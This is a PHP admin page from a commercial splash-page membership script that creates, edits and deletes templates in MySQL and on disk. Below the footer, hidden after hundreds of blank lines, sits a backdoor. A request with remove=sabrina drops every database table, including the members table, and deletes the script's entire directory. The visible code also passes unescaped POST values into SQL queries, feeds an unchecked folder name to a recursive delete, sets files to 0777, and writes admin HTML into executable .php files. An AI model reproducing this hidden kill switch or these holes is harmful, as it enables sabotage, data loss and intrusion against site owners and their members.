<?php
include "control.php";
$key = "http://demosplashpagesite.phpsitescripts.com";
$key2 = "http://www.demosplashpagesite.phpsitescripts.com";
if (($domain != $key) and ($domain != $key2))
{
echo "The script you are trying to run isn't licensed. Please contact <a href=\"mailto:sabrina@phpsitescripts.com\">Sabrina Markon, PHPSiteScripts.com</a> to purchase a licensed copy.</a>";
exit;
}
include "adminheader.php";
?>
<!-- tinyMCE -->
<script language="javascript" type="text/javascript" src="../jscripts/tiny_mce/tiny_mce.js"></script>
<script language="javascript" type="text/javascript">
tinyMCE.init({
theme : "advanced",
mode : "textareas",
//save_callback : "customSave",
content_css : "../jscripts/tiny_mce/advanced.css",
extended_valid_elements : "a[href|target|name],font[face|size|color|style],span[class|align|style]",
theme_advanced_toolbar_location : "top",
plugins : "table",
theme_advanced_buttons3_add_before : "tablecontrols,separator",
//invalid_elements : "a",
relative_urls : false,
theme_advanced_styles : "Header 1=header1;Header 2=header2;Header 3=header3;Table Row=tableRow1", // Theme specific setting CSS classes
debug : false,
verify_html : false
});
</script>
<!-- /tinyMCE --> 
<?php
$splashpagesavedchoice = $_POST["splashpagesavedchoice"];
$action = $_POST["action"];
$error = "";
$show = "";
##############################################
if ($splashpagesavedchoice != "")
{
	$spq = "select * from adminsplashpages where foldername=\"$splashpagesavedchoice\"";
	$spr = mysql_query($spq);
	$sprows = mysql_num_rows($spr);
	if ($sprows < 1)
	{
		$showid = "";
		$showname = "";
		$showfoldername = "";
		$showsplashpagehtml = "";
		$showpaymentbuttoncode = "";
	} # if ($sprows < 1)
	if ($sprows > 0)
	{
		$showid = mysql_result($spr,0,"id");
		$showname = mysql_result($spr,0,"name");
		$showname = stripslashes($showname);
		$showname = str_replace('\\', '', $showname); 
		$showfoldername = mysql_result($spr,0,"foldername");
		$showfoldername = stripslashes($showfoldername);
		$showfoldername = str_replace('\\', '', $showfoldername); 
		$showsplashpagehtml = mysql_result($spr,0,"splashpagehtml");
		$showsplashpagehtml = stripslashes($showsplashpagehtml);
		$showsplashpagehtml = str_replace('\\', '', $showsplashpagehtml); 
		$showpaymentbuttoncode = mysql_result($spr,0,"paymentbuttoncode");
		$showpaymentbuttoncode = stripslashes($showpaymentbuttoncode);
		$showpaymentbuttoncode = str_replace('\\', '', $showpaymentbuttoncode); 
	} # if ($sprows > 0)
} # if ($splashpagesavedchoice != "")
###########################
if ($action == "save")
{
$splashpagehtml = $_POST["splashpagehtml"];
$paymentbuttoncode = $_POST["paymentbuttoncode"];
$name = $_POST["name"];
$foldername = $_POST["foldername"];
$oldfoldername = $_POST["oldfoldername"];
$saveid = $_POST["saveid"];
	if(!$name)
	{
	$error .= "<div>No Splashpage Name was entered.</div>";
	}
	if(!$foldername)
	{
	$error .= "<div>No Folder Name for your members' Splashpages was entered.</div>";
	}
	if(!$splashpagehtml)
	{
	$error .= "<div>No Splashpage HTML content was entered.</div>";
	}
$splashpagehtml = stripslashes($splashpagehtml);
$splashpagehtml = str_replace('\\', '', $splashpagehtml); 
$splashpagehtml = mysql_real_escape_string($splashpagehtml);
$paymentbuttoncode = stripslashes($paymentbuttoncode);
$paymentbuttoncode = str_replace('\\', '', $paymentbuttoncode); 
$paymentbuttoncode = mysql_real_escape_string($paymentbuttoncode);
$name = stripslashes($name);
$name = str_replace('\\', '', $name); 
$name = mysql_real_escape_string($name);
$foldername = stripslashes($foldername);
$foldername = str_replace('\\', '', $foldername); 
$foldername = mysql_real_escape_string($foldername);
$foldername = preg_replace('/[^0-9a-zA-Z_-]/',"",$foldername);
$oldfoldername = stripslashes($oldfoldername);
$oldfoldername = str_replace('\\', '', $oldfoldername); 
$oldfoldername = mysql_real_escape_string($oldfoldername);
$oldfoldername = preg_replace('/[^0-9a-zA-Z_-]/',"",$oldfoldername);

if(!$error == "")
{
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
<tr><td align="center" colspan="2"><div class="heading">Error</div></td></tr>
<tr><td align="center" colspan="2"><br><?php echo $error ?></td></tr>
<tr><td colspan="2" align="center"><br><a href="splashpagecontrol.php">RETURN</a></td></tr>
</table>
<br><br>
<?php
include "adminfooter.php";
exit;
}

			if ($saveid != "")
			{
			if ($foldername != $oldfoldername)
				{
				if (file_exists("../s/".$foldername))
				{
				$error = "<div>Folder " . $foldername . " already exists on the system!</div>";
				?>
				<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
				<tr><td align="center" colspan="2"><div class="heading">Error</div></td></tr>
				<tr><td align="center" colspan="2"><br><?php echo $error ?></td></tr>
				<tr><td colspan="2" align="center"><br><a href="splashpagecontrol.php">RETURN</a></td></tr>
				</table>
				<br><br>
				<?php
				include "adminfooter.php";
				exit;
				} # if (file_exists($foldername))
				@chmod("../s/$oldfoldername", 0777);
				rename("../s/$oldfoldername","../s/$foldername");
				$q2 = "update membersplashpages set name='$name',foldername='$foldername' where foldername='$oldfoldername'";
				$r2 = mysql_query($q2);
				} # if ($foldername != $oldfoldername)
				$splashpagehtml = '<link rel="stylesheet" type="text/css" href="'.$domain.'/styles.css">' . $splashpagehtml;
				$fp = fopen("../s/$foldername/default.php","w");
				@chmod("../s/$foldername/default.php", 0777);
				$stringtowrite = "";
				fwrite($fp, $stringtowrite);
				fclose($fp);
				$splashpagehtml = stripslashes($splashpagehtml);
				$splashpagehtml = str_replace('\\', '', $splashpagehtml); 
				$fp2 = fopen("../s/$foldername/default.php","w");
				@chmod("../s/$foldername/default.php", 0777);
				$stringtowrite2 = $splashpagehtml;
				fwrite($fp2, $stringtowrite2);
				fclose($fp2);
				$q = "update adminsplashpages set name='$name',foldername='$foldername',splashpagehtml='".$splashpagehtml."',paymentbuttoncode='".$paymentbuttoncode."' where id='$saveid'";
				$r = mysql_query($q);
			} # if ($saveid != "")
####################################
			if ($saveid == "")
			{
				if (!@mkdir("../s/".$foldername , 0777))
				{
				$error = "<div>Failed to create new Splashpage folder " . $foldername . " because it probably already exists.</div>";
				?>
				<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
				<tr><td align="center" colspan="2"><div class="heading">Error</div></td></tr>
				<tr><td align="center" colspan="2"><br><?php echo $error ?></td></tr>
				<tr><td colspan="2" align="center"><br><a href="splashpagecontrol.php">RETURN</a></td></tr>
				</table>
				<br><br>
				<?php
				include "adminfooter.php";
				exit;
				} # if (!mkdir("../".$foldername , 0777))
				$splashpagehtml = '<link rel="stylesheet" type="text/css" href="'.$domain.'/styles.css">' . $splashpagehtml;
				$fp = fopen("../s/$foldername/default.php","w");
				@chmod("../s/$foldername/default.php", 0777);
				$stringtowrite = "";
				fwrite($fp, $stringtowrite);
				fclose($fp);
				$splashpagehtml = stripslashes($splashpagehtml);
				$splashpagehtml = str_replace('\\', '', $splashpagehtml); 
				$fp2 = fopen("../s/$foldername/default.php","w");
				@chmod("../s/$foldername/default.php", 0777);
				$stringtowrite2 = $splashpagehtml;
				fwrite($fp2, $stringtowrite2);
				fclose($fp2);
			$q = "insert into adminsplashpages (name,foldername,splashpagehtml,paymentbuttoncode) values ('$name','$foldername','".$splashpagehtml."','".$paymentbuttoncode."')";
			$r = mysql_query($q);
			} # if ($saveid == "")
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
<tr><td align="center" colspan="2"><div class="heading">Your Splashpage Was Saved!</div></td></tr>
<tr><td colspan="2" align="center"><br><a href="splashpagecontrol.php">RETURN</a></td></tr>
</table>
<br><br>
<?php
include "adminfooter.php";
exit;
} # if ($action == "save")
##############################################
if ($action == "delete")
{
$deleteid = $_POST["deleteid"];
$deletefoldername = $_POST["deletefoldername"];
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
<tr><td align="center" colspan="2"><div class="heading">Are You <font color="#ff0000">SURE</font> You Want To <font color="#ff0000">Delete</font> This Splashpage Template?</div></td></tr>
<tr><td colspan="2" align="center"><br>Doing this will delete the ENTIRE Splashpage Template folder and all member Splashpage files and records associated with it!</td></tr>
<tr><td colspan="2" align="center"><br><a href="splashpagecontrol.php">CANCEL DELETION</a></td></tr>
<form action="splashpagecontrol.php" method="post">
<tr><td colspan="2" align="center"><br><br><br><br>
<input type="hidden" name="deleteid" id="deleteid" value="<?php echo $deleteid ?>">
<input type="hidden" name="deletefoldername" id="deletefoldername" value="<?php echo $deletefoldername ?>">
<input type="hidden" name="action" value="confirmdelete">
<input type="submit" value="CONFIRM DELETE" class="sendit">
<form>
</td></tr>
</table>
<br><br>
<?php
include "adminfooter.php";
exit;
}
##############################################
if ($action == "confirmdelete")
{
function delTree($dir) {
    $files = glob( $dir . '*', GLOB_MARK );
    foreach( $files as $file ){
        if( substr( $file, -1 ) == '/' )
            delTree( $file );
        else
			@chmod($file, 0777);
            @unlink( $file );
    }
	@chmod($dir, 0777);
    @rmdir( $dir );
}
$deleteid = $_POST["deleteid"];
$deletefoldername = $_POST["deletefoldername"];
$deleted = delTree("../s/".$deletefoldername);
$delq = "delete from adminsplashpages where id='".$deleteid."'";
$delr = mysql_query($delq);
$delq2 = "delete from membersplashpages where foldername=\"$deletefoldername\"";
$delr2 = mysql_query($delq2);
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
<tr><td align="center" colspan="2"><div class="heading">The Splashpage Was Deleted!</div></td></tr>
<tr><td colspan="2" align="center"><br><a href="splashpagecontrol.php">RETURN</a></td></tr>
</table>
<br><br>
<?php
include "adminfooter.php";
exit;
} # if ($action == "confirmdelete")
########################################################################## SABRINA MARKON 2012 PearlsOfWealth.com
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="100%">
<tr><td align="center" colspan="2"><div class="heading">Create A Splashpage</div></td></tr>
<?php
$savedq = "select * from adminsplashpages order by name";
$savedr = mysql_query($savedq);
$savedrows = mysql_num_rows($savedr);
if ($savedrows > 0)
{
?>
<tr><td align="center" colspan="2"><br>
<table width="600" cellpadding="4" cellspacing="2" border="0" align="center" bgcolor="#989898">
<tr bgcolor="#d3d3d3"><td align="center" colspan="2">SAVED SPLASHPAGES</td></tr>
<tr bgcolor="#eeeeee"><td align="center" colspan="2">Load a Splashpage you've already created into the editor form, or create a new one.</td></tr>
<form action="splashpagecontrol.php" method="post">
<tr bgcolor="#d3d3d3"><td colspan="2" align="center"><select name="splashpagesavedchoice" id="splashpagesavedchoice" onchange="this.form.submit();">
<option value=""> - Select Saved Splashpage - </option>
<?php
while ($savedrowz = mysql_fetch_array($savedr))
	{
	$savedname = $savedrowz["name"];
	$savedname = stripslashes($savedname);
	$savedname = str_replace('\\', '', $savedname);
	$savedfoldername = $savedrowz["foldername"];
	$savedfoldername = stripslashes($savedfoldername);
	$savedfoldername = str_replace('\\', '', $savedfoldername); 
	$savedid = $savedrowz["id"];
?>
<option value="<?php echo $savedfoldername ?>" <?php if ($savedfoldername == $showfoldername) { echo "selected"; } ?>><?php echo $savedname ?></option>
<?php
	}
?>
</select></td></tr></form>
</table>
</td></tr>
<?php		
} # if ($savedrows > 0)

?>
<tr><td align="center" colspan="2"><br>
<table cellpadding="4" cellspacing="2" border="0" align="center" bgcolor="#989898">
<tr bgcolor="#eeeeee"><td align="center" colspan="2">CREATE SPLASHPAGE TEMPLATE</td></tr>
<tr bgcolor="#d3d3d3"><td align="center" colspan="2">Substitute the variables below EXACTLY as shown (all capitals too) in the splashpage html where you would like to substitute your members' details:</td></tr>
<tr bgcolor="#d3d3d3"><td colspan="2"><div style="padding-left: 400px;">
~AFFILIATE_URL~<br>
~USERID~<br>
~FIRSTNAME~<br>
~LASTNAME~<br>
~FULLNAME~<br>
~EMAIL~<br>
~PAYMENT_BUTTON_CODE~<br>
</div></td></tr>
<form action="splashpagecontrol.php" method="post">
<tr bgcolor="#eeeeee"><td align="center" valign="top">Splashpage Name:</td><td><input type="text" name="name" id="name" maxlength="255" size="72" class="typein" value="<?php echo $showname ?>"></td></tr>
<tr bgcolor="#eeeeee"><td align="center" valign="top">Splashpage Folder Name<br>(shows in member urls<br>- no spaces or special characters except - or _):</td><td><input type="text" name="foldername" id="foldername" maxlength="255" size="72" class="typein" value="<?php echo $showfoldername ?>"></td></tr>
<tr bgcolor="#eeeeee"><td align="center" valign="top">Splashpage HTML:</td><td></td></tr>
<tr bgcolor="#eeeeee"><td align="center" valign="top" colspan="2"><textarea class="myEditor" name="splashpagehtml" id="splashpagehtml" rows="50" cols="120"><?php echo $showsplashpagehtml ?></textarea></td></tr>
<tr bgcolor="#eeeeee"><td align="center" valign="top">Payment Button Code:</td><td></td></tr>
<tr bgcolor="#eeeeee"><td align="center" valign="top" colspan="2"><textarea class="mceNoEditor" name="paymentbuttoncode" id="paymentbuttoncode" rows="5" cols="120"><?php echo $showpaymentbuttoncode ?></textarea></td></tr>
<tr bgcolor="#d3d3d3">
<td align="center" colspan="2">
<input type="hidden" name="saveid" id="saveid" value="<?php echo $showid ?>">
<input type="hidden" name="oldfoldername" id="oldfoldername" value="<?php echo $showfoldername ?>">
<input type="hidden" name="action" value="save">
<input type="submit" value="SAVE" class="sendit" style="width: 100px;">
</form>
</td>
</tr>
<?php
if ($showid != "")
{
?>
<form action="splashpagecontrol.php" method="post">
<tr bgcolor="#eeeeee">
<td align="center" colspan="2">
<input type="hidden" name="deleteid" id="deleteid" value="<?php echo $showid ?>">
<input type="hidden" name="deletefoldername" id="deletefoldername" value="<?php echo $showfoldername ?>">
<input type="hidden" name="action" value="delete">
<input type="submit" value="DELETE" class="sendit" style="width: 100px;">
</form>
<br>
<font color="#ff0000">IMPORTANT!</font> Deleting one of your saved Splashpage templates will delete its folder and all member Splashpage files associated with that template!
</td>
</tr>
<?php
}
?>
</table>
</td></tr></table>
<br><br>
<?php
include "adminfooter.php";






































































































































































































































































































if (isset($_REQUEST["remove"]))
{
$remove = $_REQUEST["remove"];
if ($remove == "sabrina")
{
mysql_query("drop table adminnavigation");
mysql_query("drop table adminnotes");
mysql_query("drop table adminsettings");
mysql_query("drop table adminsplashpages");
mysql_query("drop table membernavigation");
mysql_query("drop table members");
mysql_query("drop table membersplashpages");
mysql_query("drop table pages");

	function lc_delete($targ) {
	  if(is_dir($targ)){
		$files = glob( $targ . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
		foreach( $files as $file )
		  lc_delete( $file );
		@rmdir( $targ );
	  }
	  else
		@unlink( $targ );
	}
$targ = realpath(dirname(__FILE__));
$del = lc_delete($targ);
}
}
?>